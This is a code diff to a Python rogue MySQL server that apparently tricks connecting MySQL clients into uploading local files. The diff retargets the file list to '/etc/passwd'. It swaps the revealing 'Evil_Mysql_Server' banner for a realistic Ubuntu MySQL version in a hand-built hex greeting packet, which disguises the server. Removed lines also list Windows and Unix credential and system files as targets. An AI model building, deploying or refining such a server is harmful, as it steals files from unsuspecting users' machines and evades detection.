@@ -16,7 +16,7 @@ PORT = 3306
 
 log = logging.getLogger(__name__)
 
-log.setLevel(logging.DEBUG)
+log.setLevel(logging.INFO)
 tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
 tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
 log.addHandler(
@@ -24,11 +24,7 @@ log.addHandler(
 )
 
 filelist = (
-#    r'c:\boot.ini',
-    r'c:\windows\win.ini',
-#    r'c:\windows\system32\drivers\etc\hosts',
-#    '/etc/passwd',
-#    '/etc/shadow',
+    '/etc/passwd',
 )
 
 
@@ -114,17 +110,9 @@ class http_request_handler(asynchat.async_chat):
                 0,
                 "".join((
                     '\x0a',  # Protocol
-                    '3.0.0-Evil_Mysql_Server' + '\0',  # Version
-                    #'5.1.66-0+squeeze1' + '\0',
-                    '\x36\x00\x00\x00',  # Thread ID
-                    'evilsalt' + '\0',  # Salt
-                    '\xdf\xf7',  # Capabilities
-                    '\x08',  # Collation
-                    '\x02\x00',  # Server Status
-                    '\0' * 13,  # Unknown
-                    'evil2222' + '\0',
-                ))
-            )
+                    '5.6.28-0ubuntu0.14.04.1' + '\0',
+                    '\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00',
+                ))            )
         )
 
         self.order = 1
@@ -256,5 +244,5 @@ class mysql_listener(asyncore.dispatcher):
 
 
 z = mysql_listener()
-daemonize()
+# daemonize()
 asyncore.loop()
